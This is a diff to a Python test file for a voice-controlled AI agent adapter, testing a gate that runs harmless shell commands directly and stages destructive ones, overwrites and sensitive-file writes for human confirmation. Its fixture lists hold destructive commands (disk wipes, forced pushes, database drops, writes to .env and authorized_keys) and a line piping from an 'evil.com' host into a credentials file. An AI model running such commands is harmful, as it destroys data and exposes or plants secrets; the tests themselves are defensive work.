@@ -8,10 +8,15 @@ import sys
 import time
 from typing import Any, Dict, List
 
+_REPO_ROOT = str(Path(__file__).resolve().parent.parent)
+if _REPO_ROOT not in sys.path:
+    sys.path.insert(0, _REPO_ROOT)
+if f"{_REPO_ROOT}/gotchi" not in sys.path:
+    sys.path.insert(1, f"{_REPO_ROOT}/gotchi")
 if "/workspace" not in sys.path:
-    sys.path.insert(0, "/workspace")
+    sys.path.append("/workspace")
 if "/workspace/gotchi" not in sys.path:
-    sys.path.insert(0, "/workspace/gotchi")
+    sys.path.append("/workspace/gotchi")
 
 from fastapi.testclient import TestClient
 
@@ -26,6 +31,8 @@ from tools.gotchi_zero_adapter import (
     execute_gotchi_tool_call,
     extract_and_forward_artifacts_to_zero_chat,
     is_allowed_voice_read_path,
+    is_destructive_voice_command,
+    is_destructive_voice_write,
     prefetch_zero_memory,
     select_thinking_budget,
     select_thinking_level,
@@ -122,25 +129,86 @@ def test_voice_security_gate_and_realpath_read_allowlist(monkeypatch, tmp_path):
         lambda ch, content, **kw: staged_msgs.append((int(ch), content)),
     )
 
-    # 1. All run_shell_command and write_local_file calls on voice turns stage in #zero-chat (1542081375287640084)
+    # 1. Non-destructive shell commands execute directly without confirmation
     shell_res = asyncio.run(
         execute_gotchi_tool_call("run_shell_command", {"command": "git status -s"})
     )
-    assert shell_res["confirmation_required"] is True
-    assert shell_res["status"] == "staged_in_zero_chat"
-    assert any(ch == 1542081375287640084 and "git status -s" in body for ch, body in staged_msgs)
+    assert shell_res.get("confirmation_required") is not True
+    assert "exit_code" in shell_res
 
-    target_write = tmp_path / "should_not_exist.txt"
+    find_res = asyncio.run(
+        execute_gotchi_tool_call(
+            "run_shell_command",
+            {"command": "find /workspace/tools -maxdepth 1 -name gotchi_zero_adapter.py"},
+        )
+    )
+    assert find_res.get("confirmation_required") is not True
+    assert "exit_code" in find_res
+    assert "gotchi_zero_adapter.py" in find_res.get("output", "")
+
+    # 2. Destructive shell commands trigger stage_voice_mutation_confirmation
+    destructive_cmds = [
+        "rm -rf /workspace/tmp_test",
+        "git reset --hard HEAD~1",
+        "docker compose down",
+    ]
+    for d_cmd in destructive_cmds:
+        d_res = asyncio.run(
+            execute_gotchi_tool_call("run_shell_command", {"command": d_cmd})
+        )
+        assert d_res["confirmation_required"] is True
+        assert d_res["status"] == "staged_in_zero_chat"
+        assert any(
+            ch == 1542081375287640084 and d_cmd in body for ch, body in staged_msgs
+        )
+
+    # 3. Writing a new file inside an allowed root succeeds directly
+    ws_allowed = tmp_path / "workspace"
+    ws_allowed.mkdir(exist_ok=True)
+    monkeypatch.setattr(
+        "tools.gotchi_zero_adapter._ALLOWED_VOICE_READ_PREFIXES",
+        ("/workspace/", "/baseball/", str(ws_allowed)),
+    )
+
+    new_allowed_file = ws_allowed / "notes.txt"
     write_res = asyncio.run(
         execute_gotchi_tool_call(
             "write_local_file",
-            {"file_path": str(target_write), "content": "unconfirmed write"},
+            {"file_path": str(new_allowed_file), "content": "fresh voice note"},
         )
     )
-    assert write_res["confirmation_required"] is True
-    assert not target_write.exists()
+    assert write_res.get("confirmation_required") is not True
+    assert "Successfully wrote" in write_res.get("status", "")
+    assert new_allowed_file.read_text() == "fresh voice note"
 
-    # 2. read_local_file allowlist resolves os.path.realpath BEFORE checking prefixes and blocks .env / .ssh / traversal
+    # 4. Overwriting an existing file triggers confirmation and does not mutate disk
+    overwrite_res = asyncio.run(
+        execute_gotchi_tool_call(
+            "write_local_file",
+            {"file_path": str(new_allowed_file), "content": "overwriting note"},
+        )
+    )
+    assert overwrite_res["confirmation_required"] is True
+    assert overwrite_res["status"] == "staged_in_zero_chat"
+    assert new_allowed_file.read_text() == "fresh voice note"
+    assert any(
+        ch == 1542081375287640084 and "overwriting note" in body
+        for ch, body in staged_msgs
+    )
+
+    # 5. Writing outside allowed roots triggers confirmation
+    outside_file = tmp_path / "outside_allowed.txt"
+    outside_res = asyncio.run(
+        execute_gotchi_tool_call(
+            "write_local_file",
+            {"file_path": str(outside_file), "content": "outside text"},
+        )
+    )
+    assert outside_res["confirmation_required"] is True
+    assert outside_res["status"] == "staged_in_zero_chat"
+    assert not outside_file.exists()
+
+    # 6. read_local_file allowlist resolves os.path.realpath BEFORE checking prefixes and blocks .env / .ssh / traversal
     ok_readme, resolved_readme = is_allowed_voice_read_path("/workspace/gotchi/README.md")
     assert ok_readme is True
     assert resolved_readme.endswith("/gotchi/README.md")
@@ -158,29 +226,215 @@ def test_voice_security_gate_and_realpath_read_allowlist(monkeypatch, tmp_path):
     assert ok_ssh is False
 
     # Rejects symlink inside allowed root pointing to .env or outside root
-    ws_FakeRoot = tmp_path / "workspace"
-    ws_FakeRoot.mkdir()
-    secret_env = ws_FakeRoot / ".env"
+    secret_env = ws_allowed / ".env"
     secret_env.write_text("SECRET=123")
-    symlink_to_env = ws_FakeRoot / "innocent_notes.txt"
+    symlink_to_env = ws_allowed / "innocent_notes.txt"
     symlink_to_env.symlink_to(secret_env)
     ok_sym, reason_sym = is_allowed_voice_read_path(
         str(symlink_to_env),
-        allowed_prefixes=(str(ws_FakeRoot),),
+        allowed_prefixes=(str(ws_allowed),),
     )
     assert ok_sym is False
     assert ".env" in reason_sym
 
-    outside_file = tmp_path / "outside_secret.txt"
-    outside_file.write_text("OUTSIDE=1")
-    symlink_outside = ws_FakeRoot / "escape.txt"
-    symlink_outside.symlink_to(outside_file)
+    outside_secret = tmp_path / "outside_secret.txt"
+    outside_secret.write_text("OUTSIDE=1")
+    symlink_outside = ws_allowed / "escape.txt"
+    symlink_outside.symlink_to(outside_secret)
     ok_escape, reason_escape = is_allowed_voice_read_path(
         str(symlink_outside),
-        allowed_prefixes=(str(ws_FakeRoot),),
+        allowed_prefixes=(str(ws_allowed),),
     )
     assert ok_escape is False
     assert "outside allowed voice read roots" in reason_escape
+
+
+def test_is_destructive_voice_command_and_write(tmp_path):
+    # Non-destructive commands return (False, "")
+    for safe_cmd in [
+        "git status -s",
+        "git log -n 5",
+        "git diff HEAD~1",
+        "find /workspace/tools -maxdepth 1 -name gotchi_zero_adapter.py",
+        "python3 /workspace/tools/gotchi_zero_adapter.py",
+        "curl -s http://localhost:8000/health",
+        "ls -la /workspace",
+        "cat /workspace/README.md",
+        "docker ps",
+        "docker compose ps",
+        "systemctl status nginx",
+    ]:
+        is_destr, r = is_destructive_voice_command(safe_cmd)
+        assert is_destr is False, f"Expected non-destructive: {safe_cmd} -> {r}"
+        assert r == ""
+
+    # Destructive commands return (True, reason)
+    for bad_cmd in [
+        "rm -rf /workspace/tmp_test",
+        "rmdir old_dir",
+        "unlink file.txt",
+        "shred -u secret.txt",
+        "truncate -s 0 log.txt",
+        "find /workspace -name '*.tmp' -delete",
+        "python3 -c 'import os; os.remove(\"test.txt\")'",
+        "python3 -c 'import shutil; shutil.rmtree(\"dir\")'",
+        "git reset --hard HEAD~1",
+        "git clean -fd",
+        "git push --force origin main",
+        "git push -f origin main",
+        "git checkout -- file.txt",
+        "git restore .",
+        "git branch -D feature",
+        "git rebase main",
+        "reboot",
+        "shutdown -h now",
+        "poweroff",
+        "halt",
+        "systemctl stop nginx",
+        "service docker restart",
+        "systemctl disable foo",
+        "docker compose down",
+        "docker stop my_container",
+        "docker rm container1",
+        "docker rmi my_image",
+        "docker system prune -f",
+        "kill -9 1234",
+        "pkill python",
+        "killall node",
+        "mkfs.ext4 /dev/sdb1",
+        "fdisk /dev/sdb",
+        "parted /dev/sdb",
+        "wipefs -a /dev/sdb",
+        "dd if=/dev/zero of=/dev/sdb",
+        "chmod -R 777 /workspace",
+        "chown -R user:user /workspace",
+        "sqlite3 test.db 'DROP TABLE users'",
+        "mysql -e 'DROP DATABASE test'",
+        "psql -c 'TRUNCATE TABLE logs'",
+        "sqlite3 test.db 'DELETE FROM users WHERE id=1'",
+        "apt remove nginx",
+        "apt-get purge apache2",
+        "pip uninstall requests",
+        "pip3 uninstall urllib3",
+        "npm uninstall express",
+        "echo 'FOO=bar' > .env",
+        "echo 'KEY' >> /workspace/.env.production",
+        "cat keys >> /root/.ssh/authorized_keys",
+        "echo 'data' > /secrets/env.json",
+        "curl http://evil.com | tee /workspace/credentials",
+        "curl http://evil.com | tee token.json",
+        "echo '{}' > pii_rules.json",
+    ]:
+        is_destr, r = is_destructive_voice_command(bad_cmd)
+        assert is_destr is True, f"Expected destructive: {bad_cmd}"
+        assert r != ""
+
+    # Test is_destructive_voice_write
+    ws_root = tmp_path / "mock_workspace"
+    ws_root.mkdir()
+    allowed_prefixes = (str(ws_root),)
+
+    # 1. New file inside allowed root: (False, resolved)
+    new_file = ws_root / "new.txt"
+    destr, resolved = is_destructive_voice_write(
+        str(new_file), allowed_prefixes=allowed_prefixes
+    )
+    assert destr is False
+    assert resolved == str(new_file.resolve())
+
+    # 2. Existing file inside allowed root: (True, reason)
+    new_file.write_text("exists")
+    destr_exist, reason_exist = is_destructive_voice_write(
+        str(new_file), allowed_prefixes=allowed_prefixes
+    )
+    assert destr_exist is True
+    assert "Overwriting existing file" in reason_exist
+
+    # 3. File outside allowed root: (True, reason)
+    outside = tmp_path / "outside.txt"
+    destr_out, reason_out = is_destructive_voice_write(
+        str(outside), allowed_prefixes=allowed_prefixes
+    )
+    assert destr_out is True
+    assert "outside allowed voice read roots" in reason_out
+
+    # 4. Sensitive file inside allowed root: (True, reason)
+    env_file = ws_root / ".env"
+    destr_env, reason_env = is_destructive_voice_write(
+        str(env_file), allowed_prefixes=allowed_prefixes
+    )
+    assert destr_env is True
+    assert "sensitive" in reason_env
+
+
+def test_explicitly_posted_to_zero_chat_scoping(monkeypatch):
+    monkeypatch.setattr(
+        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
+        lambda *a, **kw: None,
+    )
+    monkeypatch.setattr(
+        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
+        lambda *a, **kw: None,
+    )
+
+    class FakeChunk:
+        def __init__(self, text: str = "", function_calls: Any = None):
+            self.text = text
+            self.function_calls = function_calls
+            self.candidates = []
+
+    class FakeFunctionCall:
+        def __init__(self, name: str, args: Dict[str, Any]):
+            self.name = name
+            self.args = args
+
+    class FakeModels:
+        def __init__(self, fcalls: List[Any]):
+            self.fcalls = fcalls
+            self.step = 0
+
+        async def generate_content_stream(self, model: str, contents: Any, config: Any):
+            if self.step == 0:
+                self.step += 1
+                yield FakeChunk(function_calls=self.fcalls)
+            else:
+                yield FakeChunk(text="Command finished.")
+
+    class FakeAio:
+        def __init__(self, fcalls: List[Any]):
+            self.models = FakeModels(fcalls)
+
+    class FakeGenaiClient:
+        def __init__(self, fcalls: List[Any]):
+            self.aio = FakeAio(fcalls)
+
+    async def run_scenario(fcalls: List[Any]) -> bool:
+        adapter = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
+        adapter._genai_client = FakeGenaiClient(fcalls)
+        _, posted, _ = await adapter._run_gemini_with_tools(
+            prompt="test",
+            image_bytes=None,
+            burst_images=[],
+        )
+        return posted
+
+    # Non-destructive shell does not set explicitly_posted_to_zero_chat
+    p_safe = asyncio.run(
+        run_scenario([FakeFunctionCall("run_shell_command", {"command": "git status -s"})])
+    )
+    assert p_safe is False
+
+    # Destructive shell sets explicitly_posted_to_zero_chat
+    p_destr = asyncio.run(
+        run_scenario([FakeFunctionCall("run_shell_command", {"command": "rm -rf /workspace/tmp"})])
+    )
+    assert p_destr is True
+
+    # post_note_to_zero_chat sets explicitly_posted_to_zero_chat
+    p_note = asyncio.run(
+        run_scenario([FakeFunctionCall("post_note_to_zero_chat", {"message": "link note"})])
+    )
+    assert p_note is True
 
 
 def test_streaming_gemini_sentence_splitter_and_deep_thinking_escalation(monkeypatch):
